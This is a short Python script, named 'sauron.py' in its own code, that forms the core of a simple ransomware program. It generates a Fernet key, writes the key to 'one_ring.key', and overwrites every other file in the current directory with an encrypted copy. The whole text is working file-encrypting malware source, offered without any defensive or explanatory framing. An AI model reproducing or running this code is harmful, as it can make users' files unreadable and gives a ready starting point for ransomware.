import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
  if file == "sauron.py" or file == "one_ring.key":
    continue
  if os.path.isfile(file):
    files.append(file)

key = Fernet.generate_key()

with open("one_ring.key", "wb") as one_ring:
  one_ring.write(key)

for file in files:
  with open(file, "rb") as thefile:
    contents = thefile.read()
  contents_encrypted = Fernet(key).encrypt(contents)
  with open(file, "wb") as thefile:
    thefile.write(contents_encrypted)